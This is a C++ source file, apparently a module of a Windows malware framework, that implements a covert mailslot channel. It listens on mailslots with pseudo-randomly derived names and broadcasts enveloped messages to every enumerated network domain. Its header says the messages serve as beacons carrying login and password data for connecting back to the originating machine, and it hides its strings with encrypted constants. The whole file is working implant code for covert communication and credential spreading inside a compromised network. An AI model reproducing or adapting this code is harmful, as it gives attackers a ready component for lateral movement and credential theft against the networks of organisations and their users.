/*
	MailslotWorks.cpp
	Client and server routines to work with mailslots - 
	broadcasted connectionless tiny messages, used as beacons with payload data (for ex. login/passwords to connect to originating machine)
*/

#include <windows.h>
#include "dbg.h"
#include "MailslotWorks.h"

#ifdef ROUTINES_BY_PTR

MailslotWorks_ptrs MailslotWorks_apis;	// global var for transparent name translation into call-by-pointer	

// should be called before any other apis used to fill internal structures
VOID MailslotWorks_resolve(MailslotWorks_ptrs *apis)
{
#ifdef _DEBUG
	if (IsBadReadPtr(apis, sizeof(MailslotWorks_ptrs))) { DbgPrint("DBG_ERR: bad read ptr %p len %u", apis, sizeof(MailslotWorks_ptrs)); }
#endif
	// save to a global var
	MailslotWorks_apis = *apis;
}

#else 

#include "mem.h"
#include "dbg.h"
#include "CryptoStrings.h"
#include "RandomGen.h"
#include "MyStringRoutines.h"
#include "HashedStrings.h"
#include "DomainListMachines.h"
#include "DataCallbackManager.h"
#include "HashDeriveFuncs.h"
#include "CryptRoutines.h"
#include "NetMessageEnvelope.h"

#include "..\shared\config.h"


/*
	Fill passed structure with ptrs to all exported functions
	Used when module compiled as code to provide ptrs to some other child code
*/
VOID MailslotWorks_imports(MailslotWorks_ptrs *apis)
{
	apis->fnmwInitMailslotServer = mwInitMailslotServer;
	apis->fnmwSendMailslotMessageToDomain = mwSendMailslotMessageToDomain;
	apis->fnmwSendMailslotMessageToMainDomain = mwSendMailslotMessageToMainDomain;
	apis->fnmwSendMailslotMessageToAllDomains = mwSendMailslotMessageToAllDomains;
}


// ALL: generates mailslot name and stores to internal buffer
// wszTargetMachineName may be NULL to generate name for local machine, or '\\*' to use entire domain broadcasting 
VOID _mwGenMailslotName(LPWSTR wszTargetBuff, LPWSTR wszTargetMachineName)
{
	LPWSTR wszS;	// decrypt buffer
	RndClass *rg;	// pseudo-random number generator with constant seed

	// init rnd object
	rg = (RndClass *)my_alloc(sizeof(RndClass));
	rgNew(rg);
	rg->rgInitSeed(rg, TARGET_BUILDCHAIN_HASH ^ 0x0102030405060708);	// mailslot name should be constant among different machines, unlike pipe

	// prepare heading according to selection
	if (!wszTargetMachineName) {

		// local machine
		wszS = CRSTRW("\\\\.\\mailslot\\", "\xfe\x1f\x3a\x08\xf3\x1f\x06\x3c\xa0\x3b\xd7\xe1\x07\xeb\xe9\xcc\x21\xd3\xa6");
		lstrcpyW(wszTargetBuff, wszS);
		my_free(wszS);


	}
	else {

		lstrcatW(wszTargetBuff, wszTargetMachineName);
		wszS = CRSTRW("\\mailslot\\", "\xfd\x5f\x47\x04\xf7\x5f\x7b\x01\xec\x4e\xab\xff\x01\xa8\x93\xf0\xbb\x42\x06");
		lstrcatW(wszTargetBuff, wszS);
		my_free(wszS);

	} // wszTargetMachineName


	// do the gen
	sr_genRandomCharsRG_h(rg, 16, 32, (LPWSTR)(wszTargetBuff + lstrlenW(wszTargetBuff)));

	// free mem used
	my_free(rg);
}

// SRV: client connection dispatcher thread

DWORD WINAPI thrMailslotMessageProcessing(LPVOID lpParameter)
{
	MW_INITSERVER_PARAMS *mip = (MW_INITSERVER_PARAMS *)lpParameter;	// params from caller function
	DISPATCHER_CALLBACK_PARAMS dcp = { 0 };	// params to be passed to dispatcher function

	//	LPVOID pBuffer;	// mailslot message buffer
//	DWORD dwRead;	// amount of bytes read in message

	DbgPrint("entered");

	dcp.pInBuffer = my_alloc(MAILSLOT_MSG_BUFFER_SIZE);
	dcp.csType = ST_MAILSLOT;

	// infinite wait may be here
	while (ReadFile(mip->hSlot, dcp.pInBuffer, MAILSLOT_MSG_BUFFER_SIZE, &dcp.lInBufferLen, NULL) != 0) {

		// got message

		// try to remove generic envelope
		if (nmeCheckRemoveEnvelope(dcp.pInBuffer, &dcp.lInBufferLen, &dcp.bInputMessageId)) {

			//DbgPrint("decoded %u bytes msg of type %u", dcp.lInBufferLen, dcp.bInputMessageId);

			// issue callback
			__try {

				// call dispatcher
				//DbgPrint("calling cb at %p", mip->cdCallback);
				mip->cdCallback(&dcp);
				//DbgPrint("cb finished");

			} __except (1) { DbgPrint("ERR: exception while dispatcher call"); }

		} else { DbgPrint("ERR: msg validation failed, throwing away"); }

	}	// read

	DbgPrint("about to terminate");

	// cleanup
	my_free(dcp.pInBuffer);
	CloseHandle(mip->hSlot);
	my_free(mip);
	ExitThread(0);
}

// SRV: creates mailslot and listen for incoming messages
VOID mwInitMailslotServer(CLIENTDISPATCHERFUNC cdCallback)
{
	LPWSTR wszMailslotName;	// buffer to hold name
	//HANDLE hSlot;			// mailslot handle
	MW_INITSERVER_PARAMS *mip = NULL;	// buffer with params
	DWORD dwThreadId;		// CreateThread()
	HANDLE hThread;

	DbgPrint("entered");

	wszMailslotName = (LPWSTR)my_alloc(1024);

	// need to allocated buffer, it will be used after this function exits
	mip = (MW_INITSERVER_PARAMS *)my_alloc(sizeof(MW_INITSERVER_PARAMS));

	_mwGenMailslotName(wszMailslotName, NULL);

	mip->hSlot = CreateMailslotW(wszMailslotName, 0, MAILSLOT_WAIT_FOREVER, NULL);
	if (mip->hSlot == INVALID_HANDLE_VALUE) { DbgPrint("ERR: CreateMailslot() failed %04Xh", GetLastError()); return; }
	mip->cdCallback = cdCallback;

	// make handle not inheritable
	SetHandleInformation(mip->hSlot, HANDLE_FLAG_INHERIT, 0);

	// create processing loop
	hThread = CreateThread(NULL, 0, thrMailslotMessageProcessing, (LPVOID)mip, 0, &dwThreadId);
	if (hThread) { CloseHandle(hThread); } else { DbgPrint("ERR: failed to create dispatcher thread, le %04Xh", GetLastError()); }

	// free used mem
	my_free(wszMailslotName);

	DbgPrint("exiting");
}



// CLNT: sends broadcasted message, dwMessageLen recommended size < 400 bytes
// wszTargetDomain identifies to which domain the message should be sent
// format like '\\*' - system primary domain
//			   '\\DomainName' for a specified or '\\.' for local machine
// NB: to send to all available domains, caller should perform manual domain enumeration 
// bMailslotMessageId contains a special id value to distinct source of message
// message is enveloped into MAILSLOT_ENVELOPE before send
BOOL mwSendMailslotMessageToDomain(LPVOID pBuffer, DWORD dwMessageLen, LPWSTR wszTargetDomain, BYTE bMailslotMessageId)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszMailslotName;	
	HANDLE hSlot;	
	DWORD dwWritten;

	// buffer after making envelope, allocated by foreign func
	LPVOID pEnveloped = NULL;
	DWORD dwEnvelopedLen = 0;

	if (!wszTargetDomain) { DbgPrint("ERR: no target domain specified"); return bRes; }

	wszMailslotName = (LPWSTR)my_alloc(1024);

	// gen mailslot name to broadcast to main domain
	_mwGenMailslotName(wszMailslotName, wszTargetDomain);

	// attempt to open handle to mailslot object
	hSlot = CreateFileW(wszMailslotName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSlot != INVALID_HANDLE_VALUE) {

		// make enveloped buffer
		nmeMakeEnvelope(pBuffer, dwMessageLen, bMailslotMessageId, &pEnveloped, &dwEnvelopedLen);

		// opened ok, send message
		if (!WriteFile(hSlot, pEnveloped, dwEnvelopedLen, &dwWritten, NULL)) { DbgPrint("ERR: WriteFile() to mailslot failed le %04Xh, msg_len=%u", GetLastError(), dwEnvelopedLen); } else { /* DbgPrint("[%ws] ok sent %u bytes of %u", wszTargetDomain, dwWritten, dwEnvelopedLen); */ bRes = TRUE; }

		CloseHandle(hSlot);

		if (pEnveloped) { my_free(pEnveloped); }

	} else { DbgPrint("ERR: le %04Xh opening mailslot [%ws]", GetLastError(), wszMailslotName); } // hSlot != INVALID_HANDLE_VALUE

	// free res
	my_free(wszMailslotName);

	return bRes;
}

// calls mwSendMailslotMessageToDomain specifying '\\*' as wszTargetDomain
BOOL mwSendMailslotMessageToMainDomain(LPVOID pBuffer, DWORD dwMessageLen, BYTE bMailslotMessageId)
{
	BOOL bRes = FALSE;		// function result
	LPWSTR wszTargetDomain;	// internal decrypt buffer

	wszTargetDomain = CRSTRW("\\\\*", "\xfd\x3f\x23\x05\xfe\x3f\x1f\x31\xa7\xb7\x0d");
	bRes = mwSendMailslotMessageToDomain(pBuffer, dwMessageLen, wszTargetDomain, bMailslotMessageId);
	my_free(wszTargetDomain);

	return bRes;
}

// callback from mwSendMailslotMessageToAllDomains() to get names of all domains
BOOL CALLBACK _mwDomainEnumCallback(LPNETRESOURCE lpnr, LPWSTR wszDomainName, LPVOID pCallbackParam)
{
	MW_CALLBACK_PARAMS *mcp = (MW_CALLBACK_PARAMS *)pCallbackParam;
	LPWSTR wszDomainWithSlash;
	LPWSTR wszS;	// decrypt buffer

	// check type
	if (lpnr->dwDisplayType == RESOURCEDISPLAYTYPE_DOMAIN) {

		//DbgPrint("got domain [%ws] / [%ws]", lpnr->lpRemoteName, wszDomainName);

		// prepare '\\' + DomainName
		wszDomainWithSlash = (LPWSTR)my_alloc(1024);
		wszS = CRSTRW("\\\\", "\xfc\xbf\x91\x00\xfe\xbf\xad\x34\x0b\x27\xde");
		lstrcpyW(wszDomainWithSlash, wszS);
		my_free(wszS);
		lstrcatW(wszDomainWithSlash, wszDomainName);

		// send there
		if (mwSendMailslotMessageToDomain(mcp->pData, mcp->dwDataLen, wszDomainWithSlash, mcp->bMailslotMessageId)) { mcp->dwMessagesSent++; } else { DbgPrint("WARN: err sending to [%ws]", wszDomainWithSlash); }

		my_free(wszDomainWithSlash);
	}

	return TRUE;
}

// calls mwSendMailslotMessageToDomain via enumerating function
BOOL mwSendMailslotMessageToAllDomains(LPVOID pBuffer, DWORD dwMessageLen, BYTE bMailslotMessageId)
{
	BOOL bRes = FALSE;		// function result
	MW_CALLBACK_PARAMS mcp = { 0 };	// params to pass to enumerator callback

	// prepare params for callback
	mcp.pData = pBuffer;
	mcp.dwDataLen = dwMessageLen;
	mcp.bMailslotMessageId = bMailslotMessageId;

	// call enumerator
	dlmEnumV2(FALSE, TRUE, _mwDomainEnumCallback, (LPVOID)&mcp);

	// check if anything was sent
	if (mcp.dwMessagesSent) {
		//DbgPrint("enumed and sent to %u domains", mcp.dwMessagesSent);
		bRes = TRUE;
	} else {
		DbgPrint("WARN: no domains enumed/sent, attempting sent to current");
		bRes = mwSendMailslotMessageToMainDomain(pBuffer, dwMessageLen, bMailslotMessageId);
	}

	return bRes;
}

#endif